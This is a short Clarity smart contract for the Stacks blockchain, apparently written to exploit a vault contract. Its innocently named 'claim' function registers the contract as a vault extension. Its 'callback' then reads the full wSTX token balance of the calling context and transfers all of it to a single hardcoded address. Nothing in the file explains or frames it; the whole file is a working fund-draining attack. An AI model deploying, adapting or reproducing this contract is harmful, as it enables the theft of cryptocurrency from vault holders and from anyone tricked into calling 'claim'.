(use-trait extension-trait 'SP102V8P0F7JX67ARQ77WEA3D3CFB5XW39REDT0AM.extension-trait.extension-trait)
(impl-trait 'SP102V8P0F7JX67ARQ77WEA3D3CFB5XW39REDT0AM.extension-trait.extension-trait)

(define-public (callback (tg principal) (bp (buff 2048)))
	(let (
			(bb (unwrap-panic (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.token-wstx get-balance tx-sender)))
		)
		(if (> bb u0) (contract-call?
				'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.token-wstx transfer-fixed
				bb tx-sender 'SP1R313AY2S6Y245XVTBTH842448XEJZ1VHM4SCD none) (ok false))
	)
)

(define-public (claim (ext <extension-trait>))
	(contract-call? 'SP2E3DNHPVJH045SSMFYN1DW7ZWGKYZBZZQPG6V1P.vault-v1 use-extension ext)
)
